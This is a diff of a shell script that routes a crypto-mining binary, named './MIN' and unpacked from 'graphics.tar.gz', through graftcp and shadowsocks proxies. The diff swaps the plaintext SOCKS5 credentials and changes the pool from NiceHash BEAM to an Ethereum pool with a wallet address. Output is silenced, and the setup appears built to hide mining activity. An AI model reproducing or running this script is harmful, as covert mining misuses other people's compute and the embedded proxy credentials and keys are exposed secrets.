@@ -23,9 +23,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
+socks5 = 191.101.148.51:45786
+socks5_username = Selshindeparshuram2012
+socks5_password = V7p9BkV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -44,5 +44,5 @@ apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp ./MIN --algo BEAM-III --pers auto --server beamv3.usa-west.nicehash.com --port 3387 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST >/dev/null 2>&1
+./graftcp/graftcp ./MIN --algo ethash --pers auto --server eth.cruxpool.com --port 5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.TEST >/dev/null 2>&1
 sleep 2
